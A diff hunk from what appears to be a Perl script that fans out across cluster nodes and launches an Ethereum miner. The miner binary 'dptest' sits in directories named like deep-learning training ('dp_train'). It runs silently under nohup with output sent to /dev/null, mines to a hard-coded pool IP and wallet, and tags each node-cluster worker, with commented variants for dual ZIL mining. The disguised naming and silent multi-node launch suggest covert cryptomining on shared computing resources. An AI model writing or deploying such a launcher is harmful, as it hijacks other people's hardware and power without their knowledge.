@@ -83,6 +83,7 @@ $pm->start and next;
     #$mining_cmd ="nohup ~/dp_train/dptest --algo ETHASH --pool 18.167.166.214:4444 --user 0x7D599D3920Fa565957ea81796c05b3f3450531FE\.$nodename-$cluster 2>&1 >/dev/null &";
 	$mining_cmd = "nohup /home/jsp/dp_trainT/dptest -a ethash -o stratum+tcp://18.167.166.214:4444 \\
         -u 0x7D599D3920Fa565957ea81796c05b3f3450531FE -p x -w $nodename-$cluster 2>&1 >/dev/null &";
+     #   /home/jsp/dp_trainT/dptest -a ethash -o stratum+tcp://18.167.166.214:4444 -u 0x7D599D3920Fa565957ea81796c05b3f3450531FE -p x -w 23-182
     #nohup ~/dp_train/dptest --algo ETHASH --pool 18.167.166.214:4444 --user 0x7D599D3920Fa565957ea81796c05b3f3450531FE.node42-161 2>&1 >/dev/null &
 	
 #~/dp_train/dptest --algo ETHASH --pool 18.167.166.214:4444 --user 0x7D599D3920Fa565957ea81796c05b3f3450531FE.node42-161 --dualmode zil --dualpool eu.ezil.me:5555 --dualuser 0x7D599D3920Fa565957ea81796c05b3f3450531FE.zil1vv6h52ra38qac68er7t9jv8ymv3957ukfxz2f4 --worker node42_161 --enablezilcache 
